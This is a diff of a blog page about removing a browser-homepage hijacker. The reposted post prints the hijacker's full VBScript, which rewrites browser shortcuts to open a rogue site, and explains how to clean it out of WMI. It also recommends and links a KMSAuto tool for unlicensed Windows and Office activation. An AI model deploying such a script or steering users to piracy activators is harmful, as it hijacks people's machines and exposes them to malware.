@@ -88,7 +88,7 @@
 <meta property="og:image" content="https://pic1.zhimg.com/50/v2-4f424c287c30e2a2ef31acc14043c1c9_hd.jpg">
 <meta property="og:image" content="https://pic7.zhimg.com/50/v2-d6376daf291d17833f10b6976246af9b_hd.jpg">
 <meta property="og:image" content="https://pic2.zhimg.com/50/v2-a571e709fb0cb04219e7f25489fd2272_hd.jpg">
-<meta property="og:updated_time" content="2018-01-23T05:21:25.793Z">
+<meta property="og:updated_time" content="2018-12-29T09:51:17.133Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Chrome主页被篡改后如何解决？(部分内容转载)">
 <meta name="twitter:description" content="不少朋友可能都遇到过浏览器的主页被恶意篡改成某些令人作呕的国产网页，具体哪些网站，我想必也不必多说，大家也都心知肚明。 篡改浏览器的主页有很多种途径，最常见的就是直接去修改应用程序的快捷方式的 Command line ，强制在默认代码后加入将被导向的流氓网址。用这种方法可以说是挺直接的，我们也最容易发现问题所在。下面转载一篇今天发现并用到的一篇文章，希望能够给您带来一些帮助。 以下为原文：">
@@ -198,6 +198,26 @@
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
             首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
           </a>
         </li>
       
@@ -328,6 +348,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tips/" itemprop="url" rel="index">
+                    <span itemprop="name">Tips</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -380,7 +422,7 @@
 <p></p><p><br></p><p>在右侧栏右键点击ActiveScriptEventConsumer，并通过view instant properties查看属性：</p><p><br></p><p></p>
 <p><div align="center"><br><img src="https://pic7.zhimg.com/50/v2-d6376daf291d17833f10b6976246af9b_hd.jpg" alt=""><br></div></p>
 <p></p><p><br></p><p>在Script Text那一栏我们可以看到这段脚本：</p><div class="highlight"><pre><code class="language-text"><span></span>On Error Resume Next<p></p>
-<p>Const link = “<a href="http://hao.qquu8.com/?m=yx&amp;amp;r=j" target="_blank" rel="noopener">http://hao.qquu8.com/?m=yx&amp;amp;r=j</a>“<br>Const link360 = “<a href="http://hao.qquu8.com/?m=yx&amp;amp;r=j&amp;amp;s=3" target="_blank" rel="noopener">http://hao.qquu8.com/?m=yx&amp;amp;r=j&amp;amp;s=3</a>“<br>browsers = “114ie.exe,115chrome.exe,1616browser.exe,2345chrome.exe,2345explorer.exe,360se.exe,360chrome.exe,,avant.exe,baidubrowser.exe,chgreenbrowser.exe,chrome.exe,firefox.exe,greenbrowser.exe,iexplore.exe,juzi.exe,kbrowser.exe,launcher.exe,liebao.exe,maxthon.exe,niuniubrowser.exe,qqbrowser.exe,sogouexplorer.exe,srie.exe,tango3.exe,theworld.exe,tiantian.exe,twchrome.exe,ucbrowser.exe,webgamegt.exe,xbrowser.exe,xttbrowser.exe,yidian.exe,yyexplorer.exe”<br>lnkpaths = “C:\Users\Public\Desktop,C:\ProgramData\Microsoft\Windows\Start Menu\Programs,C:\Users\sjtul\Desktop,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar,C:\Users\sjtul\AppData\Roaming\Microsoft\Windows\Start Menu\Programs”<br>browsersArr = split(browsers,”,”)<br>Set oDic = CreateObject(“scripting.dictionary”)<br>For Each browser In browsersArr<br>    oDic.Add LCase(browser), browser<br>Next<br>lnkpathsArr = split(lnkpaths,”,”)<br>Set oFolders = CreateObject(“scripting.dictionary”)<br>For Each lnkpath In lnkpathsArr<br>    oFolders.Add lnkpath, lnkpath<br>Next<br>Set fso = CreateObject(“Scripting.Filesystemobject”)<br>Set WshShell = CreateObject(“Wscript.Shell”)<br>For Each oFolder In oFolders<br>    If fso.FolderExists(oFolder) Then<br>        For Each file In fso.GetFolder(oFolder).Files<br>            If LCase(fso.GetExtensionName(file.Path)) = “lnk” Then<br>                Set oShellLink = WshShell.CreateShortcut(file.Path)<br>                path = oShellLink.TargetPath<br>                name = fso.GetBaseName(path) &amp; “.” &amp; fso.GetExtensionName(path)<br>                If oDic.Exists(LCase(name)) Then<br>                    If LCase(name) = LCase(“360se.exe”) Then<br>                        oDicShellLink.Arguments = link360<br>                    Else<br>                        oShellLink.Arguments = link<br>                    End If<br>                    If file.Attributes And 1 Then<br>                        fsoile.Attributes = file.Attributes - 1<br>                    End If<br>                    oShellLink.Save<br>                End If<br>            End If<br>        Next<br>    End If<br>Next<br></p></code></pre></div><p>终于抓到了幕后黑手。可以看到这是一段VBScript代码，攻击目标涵盖了包括Chrome、360、Firefox、搜狗等30余种常见的浏览器。脚本以浏览器的安装地址为切入点，创建WshShell对象，进而生成植入了流氓网站的快捷方式。360浏览器有限定主页格式，于是这段脚本还特地修饰了流氓网站的链接。唉，流氓至此，也是服了。</p><p>查到了源头如何清清除这段造孽的脚本呢？直接在WMI Event Viewer中将_EventFilter.Name=”VBScriptKids_filter”右键删掉会被系统拒绝掉，需要去WMI Event Viewer的安装位置，右键以管理员方式运行exe文件才能删掉。之后还要把各个快捷方式都改回不带流氓网站的版本，包括桌面上的、开始菜单里的以及快速访问栏里的快捷方式，其中开始菜单里的快捷方式要去C:\ProgramData\Microsoft\Windows\Start Menu\Programs里改掉。唉，一趟下来真是让人心累，好在最终浏览器摆脱了流氓网站的劫持：</p><p><br></p><div align="center"><br><img src="https://pic2.zhimg.com/50/v2-a571e709fb0cb04219e7f25489fd2272_hd.jpg" alt=""><br></div><p></p>
+<p>Const link = “<a href="http://hao.qquu8.com/?m=yx&amp;amp;r=j" target="_blank" rel="noopener">http://hao.qquu8.com/?m=yx&amp;amp;r=j</a>“<br>Const link360 = “<a href="http://hao.qquu8.com/?m=yx&amp;amp;r=j&amp;amp;s=3" target="_blank" rel="noopener">http://hao.qquu8.com/?m=yx&amp;amp;r=j&amp;amp;s=3</a>“<br>browsers = “114ie.exe,115chrome.exe,1616browser.exe,2345chrome.exe,2345explorer.exe,360se.exe,360chrome.exe,,avant.exe,baidubrowser.exe,chgreenbrowser.exe,chrome.exe,firefox.exe,greenbrowser.exe,iexplore.exe,juzi.exe,kbrowser.exe,launcher.exe,liebao.exe,maxthon.exe,niuniubrowser.exe,qqbrowser.exe,sogouexplorer.exe,srie.exe,tango3.exe,theworld.exe,tiantian.exe,twchrome.exe,ucbrowser.exe,webgamegt.exe,xbrowser.exe,xttbrowser.exe,yidian.exe,yyexplorer.exe”<br>lnkpaths = “C:\Users\Public\Desktop,C:\ProgramData\Microsoft\Windows\Start Menu\Programs,C:\Users\sjtul\Desktop,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar,C:\Users\sjtul\AppData\Roaming\Microsoft\Windows\Start Menu\Programs”<br>browsersArr = split(browsers,”,”)<br>Set oDic = CreateObject(“scripting.dictionary”)<br>For Each browser In browsersArr<br>​    oDic.Add LCase(browser), browser<br>Next<br>lnkpathsArr = split(lnkpaths,”,”)<br>Set oFolders = CreateObject(“scripting.dictionary”)<br>For Each lnkpath In lnkpathsArr<br>​    oFolders.Add lnkpath, lnkpath<br>Next<br>Set fso = CreateObject(“Scripting.Filesystemobject”)<br>Set WshShell = CreateObject(“Wscript.Shell”)<br>For Each oFolder In oFolders<br>​    If fso.FolderExists(oFolder) Then<br>​        For Each file In fso.GetFolder(oFolder).Files<br>​            If LCase(fso.GetExtensionName(file.Path)) = “lnk” Then<br>​                Set oShellLink = WshShell.CreateShortcut(file.Path)<br>​                path = oShellLink.TargetPath<br>​                name = fso.GetBaseName(path) &amp; “.” &amp; fso.GetExtensionName(path)<br>​                If oDic.Exists(LCase(name)) Then<br>​                    If LCase(name) = LCase(“360se.exe”) Then<br>​                        oDicShellLink.Arguments = link360<br>​                    Else<br>​                        oShellLink.Arguments = link<br>​                    End If<br>​                    If file.Attributes And 1 Then<br>​                        fsoile.Attributes = file.Attributes - 1<br>​                    End If<br>​                    oShellLink.Save<br>​                End If<br>​            End If<br>​        Next<br>​    End If<br>Next<br></p></code></pre></div><p>终于抓到了幕后黑手。可以看到这是一段VBScript代码，攻击目标涵盖了包括Chrome、360、Firefox、搜狗等30余种常见的浏览器。脚本以浏览器的安装地址为切入点，创建WshShell对象，进而生成植入了流氓网站的快捷方式。360浏览器有限定主页格式，于是这段脚本还特地修饰了流氓网站的链接。唉，流氓至此，也是服了。</p><p>查到了源头如何清清除这段造孽的脚本呢？直接在WMI Event Viewer中将_EventFilter.Name=”VBScriptKids_filter”右键删掉会被系统拒绝掉，需要去WMI Event Viewer的安装位置，右键以管理员方式运行exe文件才能删掉。之后还要把各个快捷方式都改回不带流氓网站的版本，包括桌面上的、开始菜单里的以及快速访问栏里的快捷方式，其中开始菜单里的快捷方式要去C:\ProgramData\Microsoft\Windows\Start Menu\Programs里改掉。唉，一趟下来真是让人心累，好在最终浏览器摆脱了流氓网站的劫持：</p><p><br></p><div align="center"><br><img src="https://pic2.zhimg.com/50/v2-a571e709fb0cb04219e7f25489fd2272_hd.jpg" alt=""><br></div><p></p>
 <p></p><p><br></p><p>当然在这时候，你可以点击之前下载的WMI安装包，把WMI系列工具卸载掉。</p><p>最后提一下电脑中毒的原因。我分析是前几天用了小马激活这个工具来激活Windows系统，当时并没有激活成功反而还引来了病毒。推荐一款<a href="https://link.zhihu.com/?target=https%3A//myfreeproject.com/soft/81-kmsauto-net-2016.html" class=" wrap external" target="_blank" rel="nofollow noreferrer">俄罗斯人开发的工具</a>，可以成功激活Windows系统和Office软件，也不会招来一些流氓脚本：<a href="https://link.zhihu.com/?target=https%3A//arlenluo.github.io./images/post6/KMSAuto-Net-1.4.9.zip" class=" wrap external" target="_blank" rel="nofollow noreferrer">KMSAuto</a></p><p>详见<a href="https://link.zhihu.com/?target=https%3A//jing-luo.github.io/2017/03/DefeatYourBrowser/" class=" wrap external" target="_blank" rel="nofollow noreferrer">抢救被流氓网站劫持的浏览器主页</a></p><hr><p></p>
 <p>注：</p>
 <p>转载自知乎</p>
@@ -505,14 +547,32 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
             
 
             
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
 
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
             
 
           </nav>
